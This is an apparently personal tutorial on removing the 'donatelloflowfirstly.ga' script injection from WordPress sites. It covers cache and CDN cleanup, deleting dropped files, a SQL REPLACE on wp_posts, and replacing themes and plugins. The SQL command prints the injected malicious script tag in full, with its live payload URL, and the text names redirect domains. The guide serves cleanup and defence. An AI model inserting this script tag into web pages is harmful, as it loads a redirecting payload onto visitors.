# # How to Remove "js.donatelloflowfirstly.ga" from Wordpress
New virus from the domain " js.donatelloflowfirstly.ga " is infecting many WordPress sites these days by injecting a line of JS code into the wordpress themes/plugins files and all posts and pages via sql command. The virus will redirect the sites to malicious domains like  blackwaterforllows.ga ,  donatelloflowfirstly.ga , and  blackwaterforllows.ga .
**How it remove it**
For now, there is no clues how this happened and the only way is to clean it manually! Here is my steps:

**1: First Step**
Very important. De-active CDN function first, and you need to turn offer Memcached / Redis if you are running these with VPS hosting.

**2: Basic Step**
1): Check your root  /public_html  folder via Cpanel, or you can manager files with other panel if your sites running on VPS. Find and delete the new generated malware file. Most of time the file named with  _a  or  _t , there is no suffix.

2): Delete all Cached Files. Many wordpress sites usie cache plugins, just delete them since many cached files been injected too. Normally the cached files are located in folder  wp-content .

**3: Clean DataBase**
It's easy to manager your database with Phpmyadmin, or you can run the command via SSH if running your site wit LNMP on VPS.
Login Phpmyadmin via Cpanel or other panels, click on the site database, and run the following SQL command:

```
UPDATE wp_posts SET post_content = (REPLACE (post_content, “<script src=’https://js.donatelloflowfirstly.ga/stat.js?n=ns1' type=’text/javascript’></script>”, ‘’));
```
**4: Clean Core Files**
There are many ways to clean your wordpress files. Here is my way:

1): Zip all the site files and download the zip file to desktop.

2): Unzip the files to the folder, " waikey " as an example.

3): Located to the folder  wp-content / plugins , and delete all plugins. Then replace with the clean plugins into the folder. Same with themes files, delete all themes and replace with clean themes.

5): Now run the VSCode editor, you can download it at: https://code.visualstudio.com/ and install it.

6): Open the  waikey (example) folder via VSCode, then click  Edit > Search in the files  to search the keywords:  donatelloflowfirstly . There should be only a few files been found since we have deleted all Cached Files and replaced all Themes and Plugins. Edit those files if you know how to or just replace them with clean files.

7): For now, all files are clean. Delete your whole site, and upload this clean backup to the site folder. Your site should be OK now.

There is another way to clean the file if you can login to site admin panel. Install  Wordfence  plugin and scan the whole stie. The Wordfence will find out those injected files, just edit them or replace them with clean files.

For more detials , please view: https://www.waikey.com/vps-tutorials/remove-js-donatelloflowfirstly-ga/

Remeber to backup your site and database everyday!
